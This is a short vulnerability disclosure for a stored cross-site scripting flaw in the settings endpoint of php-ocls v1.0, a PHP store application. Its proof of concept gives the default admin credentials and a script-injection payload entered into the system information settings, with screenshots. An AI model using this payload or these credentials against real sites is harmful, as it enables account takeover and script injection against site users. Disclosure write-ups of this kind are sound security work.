# php-ocls<=v1.0 Authenticated Stored Cross-Site Scripting(XSS)

## Description

    php-ocls<=v1.0 /php-ocls/classes/SystemSettings.php?f=update_settings interface has a verified xss vulnerability

## source code

    php-ocls<=1.0
    Software Link: https://www.sourcecodester.com/php/16397/online-computer-and-laptop-store-using-php-and-mysql-source-code-free-download.html

## Author

    yangfan2@webray.com.cn inc  

## Proof of Concept

1. login system(default: admin:admin&123)

   /php-ocls/admin/login.php

| ![image-20240816163739350](https://raw.githubusercontent.com/0xffaaa/cve/main/php-ocls-Arbitrary File Upload.assets/image-20240816163739350.png) |
| ------------------------------------------------------------ |

2. System Information Settings

   input

   ```
   /><script>alert(1);</script>
   ```

| ![image-20240816165315627](https://raw.githubusercontent.com/0xffaaa/cve/main/php-ocls-Arbitrary Stored Cross-Site Scripting(XSS).assets/image-20240816165315627.png) |
| ------------------------------------------------------------ |

submit

| ![image-20240816165359397](https://raw.githubusercontent.com/0xffaaa/cve/main/php-ocls-Arbitrary Stored Cross-Site Scripting(XSS).assets\image-20240816165359397.png) |
| ------------------------------------------------------------ |

